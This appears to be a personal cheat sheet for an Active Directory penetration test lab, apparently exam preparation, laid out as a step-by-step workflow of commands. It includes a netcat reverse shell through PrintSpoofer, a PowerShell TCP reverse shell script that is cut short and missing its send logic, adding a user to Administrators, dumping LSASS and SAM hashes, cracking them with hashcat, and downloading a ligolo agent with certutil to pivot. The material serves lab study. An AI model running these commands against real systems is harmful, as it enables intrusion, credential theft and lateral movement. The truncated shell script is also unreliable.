AD SET Workflow

1. Scan

First Always run a nmap scan

sudo nmap -p- --open --min-rate 1000 -sS -n -Pn target_ip -oN openPorts
nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) target_ip -oN services
2. Access to the server

Once we find valir user and password/hash we connect via winrm


evil-winrm -i IP -u user -p 'Password123!'

Then we always enumerate


whoami
echo %USERNAME%
whoami /priv
whoami /groups
whoami /all
net user
net user username
net localgroup
net localgroup Administrators
net user /domain
net group /domain

Now we check for more networks

ipconfig
3. Privesc

After we find any interesting privilege, we try to escalate our privileges

Option 1 using nc

After we find any interesting privilege, we try to escalate our privileges

We will use SeImpersonate as an example

We upload and execute PrintSpoofer64.exe in order to see if we are nt authority\system


upload PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c "cmd /c whoami"

Now we upload nc.exe and launch revershell. Out netcat listener whould be waiting already


rlwrap nc -nlvp 9999
            

upload nc.exe
.\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe 10.10.10.10 9999 -e cmd.exe"

Option 2 using shell.ps1

We create the following script shell.ps1 in our kali


                $client = New-Object System.Net.Sockets.TCPClient("192.168.45.192",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);

$sendback2  = $sendback + "PS " + (pwd).Path + "> ";

}

And Upload Printspoofer.exe

At this point we should have an nt authority\system revershell

4. What to do after admin revershell

First, we always add our known user to the administrator grorup


net localgroup Administrators eric.wallows /add

Then we can restart our evil-winrm session that we started on step 1

Get hashes

Once we are admin, we can try to dump NTLM passwords and try to crack it


nxc smb 192.168.219.141 -u Eric.Wallows -p EricLikesRunning800 -M lsassy
hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt --quiet

We can also try to get SAM hashes


reg save HKLM\SAM sam  
reg save HKLM\SYSTEM system  
reg save HKLM\SECURITY security

5. Pivoting

It is very important to start pivoting when we extracted everything that we could like passwords, hashses, users..

First we will start ligolo


sudo ./proxy -selfcert

We also need to upload the agent.exe file to the server

We can do it via http python server or upload from evil-winrm

Then we start agent.exe


certutil -urlcache -split -f http://192.168.45.192:8000/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect 192.168.45.192:11601 -ignore-cert

After this, we set the session on ligolo and we start the tunneling


session 1
autoroute

When everything is done, we sould be able to ping the newnetwork


ping 10.10.179.140
6. After pivoting

Our goal here is to get a shell on pivoted system

Always run nmap normally

sudo nmap -p- --open --min-rate 1000 -sS -n -Pn target_ip -oN openPorts
nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) target_ip -oN services
